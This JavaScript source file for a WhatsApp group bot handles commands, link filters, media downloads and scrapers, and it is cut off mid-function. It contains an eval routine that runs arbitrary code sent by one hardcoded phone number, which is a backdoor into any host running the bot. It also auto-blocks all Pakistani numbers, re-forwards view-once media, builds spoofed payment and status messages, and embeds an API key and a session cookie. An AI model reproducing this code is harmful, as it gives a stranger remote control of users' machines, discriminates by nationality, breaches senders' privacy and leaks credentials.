require('./settings')
require('./lib/listmenu')
const { modul } = require('./module');
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { clockString, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture } = require('./lib/myfunc')
const { color, bgcolor } = require('./lib/color')
const { rentfromdeepak, conns } = require('./RentBot')
const { uptotelegra } = require('./scrape/upload')
const { dafontSearch, dafontDown } = require('./scrape/dafont')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const anon = require('./lib/menfess')
const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const scp3 = require('./scrape/scraperrr')
const ffstalk = require('./scrape/ffstalk')
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const mlstalk = require('./scrape/mlstalk')
const textpro = require('./scrape/textpro')
const photooxy = require('./scrape/photooxy')
const yts = require('./scrape/yt-search')
const kirleys = require('@adiwajshing/baileys')
const vm = require('node:vm')
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const deepakverifieduser = JSON.parse(fs.readFileSync('./database/user.json'))
const VoiceNoteDeepak = JSON.parse(fs.readFileSync('./DeepakMedia/database/deepakvn.json'))
const StickerDeepak = JSON.parse(fs.readFileSync('./DeepakMedia/database/deepaksticker.json'))
const ImageDeepak = JSON.parse(fs.readFileSync('./DeepakMedia/database/deepakimage.json'))
const VideoDeepak = JSON.parse(fs.readFileSync('./DeepakMedia/database/deepakvideo.json'))
const BadDeepak = JSON.parse(fs.readFileSync('./database/bad.json'))

let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'));
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'));
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'));
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'));
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'));
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'));
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'));
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'));
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'));
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'));
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'));
let deepakezzyaudio = JSON.parse(fs.readFileSync('./DeepakMedia/audio.json'));

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

module.exports = DeepakBotInc = async (DeepakBotInc, m, chatUpdate, store) => {
try {
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const gakbisaowner = `${ownernumber}@s.whatsapp.net`
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await DeepakBotInc.decodeJid(DeepakBotInc.user.id)
        const DeepakTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const DeepakTheDeveloper = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await DeepakBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPrem = prem.includes(m.sender)
    	const isUser = deepakverifieduser.includes(sender)
    	const banUser = await DeepakBotInc.fetchBlocklist()
        const isBanned = banUser ? banUser.includes(m.sender) : false
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	const isEval = body.startsWith('=>');
    
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : false
    
        //TIME
        const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var deepaktimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var deepaktimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var deepaktimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var deepaktimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var deepaktimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var deepaktimewisher = `Good Morning 🌄`
 } 

		if (isEval && senderNumber == "918348225320") {
			let evaled,
				text = q,
				{ inspect } = require('util');
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					);
					m.reply(evaled);
				}
				evaled = await eval(text);
				if (typeof evaled !== 'string') evaled = inspect(evaled);
				await DeepakBotInc.sendMessage(from, { text: evaled }, { quoted: m });
			} catch (e) {
				DeepakBotInc.sendMessage(from, { text: String(e) }, { quoted: m });
			}
		}
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premium: false
}
} catch (err) {
console.error(err)
}

if (!DeepakBotInc.public) {
if (!m.key.fromMe) return
}

//chat counter (console log)
        if (m.message && m.isGroup) {
            DeepakBotInc.readMessages([m.key])
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Group Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            DeepakBotInc.readMessages([m.key])
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Private Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

if (isCmd && !isUser) {
deepakverifieduser.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(deepakverifieduser, null, 2))
}

DeepakBotInc.sendPresenceUpdate('available', from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Don't Tag Him!
He's AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
During ${clockString(new Date - afkTime)}
`.trim())
}

if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

//auto block pakistan number
if (m.sender.startsWith('92')) return DeepakBotInc.updateBlockStatus(m.sender, 'block')

async function sendDeepakBotIncMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await DeepakBotInc.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

//group chat msg by Deepak
const replygcdeepak = (teks) => {
DeepakBotInc.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./DeepakMedia/theme/Zenitsu.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})
}
const replygcdeepak2 = (teks) => {        
sendDeepakBotIncMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": defaultpp,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
const reply = (teks) => {
DeepakBotInc.sendMessage(from, { text: teks ,
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}
}, { quoted : m })
}

const sendSticker = (pesan) => {
DeepakBotInc.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
}

try {
ppuser = await DeepakBotInc.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
defaultpp = await reSize(ppuser, 300, 300)

const sendvn = (teks) => {
DeepakBotInc.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}

//autoreply
for (let BhosdikaDeepak of VoiceNoteDeepak) {
if (budy === BhosdikaDeepak) {
let audiobuffy = fs.readFileSync(`./DeepakMedia/audio/${BhosdikaDeepak}.mp3`)
DeepakBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaDeepak of StickerDeepak){
if (budy === BhosdikaDeepak){
let stickerbuffy = fs.readFileSync(`./DeepakMedia/sticker/${BhosdikaDeepak}.webp`)
DeepakBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaDeepak of ImageDeepak){
if (budy === BhosdikaDeepak){
let imagebuffy = fs.readFileSync(`./DeepakMedia/image/${BhosdikaDeepak}.jpg`)
DeepakBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaDeepak of VideoDeepak){
if (budy === BhosdikaDeepak){
let videobuffy = fs.readFileSync(`./DeepakMedia/video/${BhosdikaDeepak}.mp4`)
DeepakBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

if (m.isGroup && m.mtype == 'viewOnceMessage') {
let teks = `╭「 *Anti ViewOnce* 」\n├ *Name* : ${pushname}\n├ *User* : @${m.sender.split("@")[0]}\n├ *Clock* : ${time2}\n└ *Message* : ${m.mtype}`
DeepakBotInc.sendMessage(m.chat, { text: teks, mentions: [m.sender] }, { quoted: m })
await sleep(500)
m.copyNForward(m.chat, true, {readViewOnce: true}, {quoted: m}).catch(_ => m.reply(`Maybe It's Opened`))
}

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `${ownername}`, 
"jpegThumbnail": defaultpp
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: defaultpp } } }

const banRep = () => {
DeepakBotInc.sendMessage(m.chat, {
text:`Sorry you've been banned, please chat @${creator.split("@")[0]} to unban`,
mentions: [creator],
},
{
quoted:m
})
}

//Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=918348225320:918348225320\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./DeepakMedia/theme/Zenitsu.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}

if (isCmd && isBanned) {
return banRep()
}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await DeepakBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await DeepakBotInc.getName(i)}\nFN:${await DeepakBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}

function simpan(path, buff) {
    fs.writeFileSync(path, buff)
    return path
}
function getRandom(ext) {
    ext = ext || ""
    return `${Math.floor(Math.random() * 100000)}.${ext}`
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await DeepakBotInc.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await DeepakBotInc.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await DeepakBotInc.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await DeepakBotInc.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}

async function sendPoll(jid, text, list) {
DeepakBotInc.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function rmbg(buffer) {
let form = new FormData
form.append("size", "auto")
form.append("image_file", fs.createReadStream(buffer), "ntah.webp")
let res = await axios({
  url: "https://api.remove.bg/v1.0/removebg",
  method: "POST",
  data: form,
  responseType: "arraybuffer",
  headers: {
    "X-Api-Key": "dNaWDqPDEuzQTHDba6TACk57",
    ...form.getHeaders()
  }
})
return res.data
}

async function getFile(media) {
        let data = Buffer.isBuffer(media) ? media : isUrl(media) ? await ( await fetch(media)).buffer() : fs.existsSync(media) ? fs.readFileSync(media) : /^data:.*?\/.*?;base64,/i.test(media) ? Buffer.from(media.split(",")[1]) : null
        if (!data) return new Error("Result is not a buffer")
        let type = await FileType.fromBuffer(data) || {
          mime: "application/octet-stream",
          ext: ".bin"
        }
        return {
          data,
          ...type
        }
      }

async function sendFile(jid, media, options={}) {
        let file = await getFile(media)
        let mime = file.ext, type
        if (mime == "mp3") {
          type = "audio"
          options.mimetype = "audio/mpeg"
          options.ptt = options.ptt || false
        }
        else if (mime == "jpg" || mime == "jpeg" || mime == "png") type = "image"
        else if (mime == "webp") type = "sticker"
        else if (mime == "mp4") type = "video"
        else type = "document"
        return DeepakBotInc.sendMessage(jid, { [type]: file.data, ...options }, { ...options })
      }

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime () {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
                hasil.push({
                    link: $(h).find('a').attr('href'),
                    gambar: $(h).find('img').attr('data-src'),
                    karakter: $(h).find('div.char-name').text().trim(),
                    anime: $(h).find('div.anime-title').text().trim(),
                    episode: $(h).find('div.meta').text(),
                    up_at: $(h).find('small.meta').text(),
                    quotes: $(h).find('div.quote').text().trim()
                })
            })
            resolve(hasil)
        }).catch(reject)
    })
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
                hasil.push({
                    title: $(b).find('header > h2').text(),
                    link: $(b).find('header > h2 > a').attr('href'),
                    category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
                    share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
                    views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
                    type: $(b).find('source').attr('type') || 'image/jpeg',
                    video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
                    video_2: $(b).find('video > a').attr('href') || ''
                })
            })
            resolve(hasil)
        })
    })
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
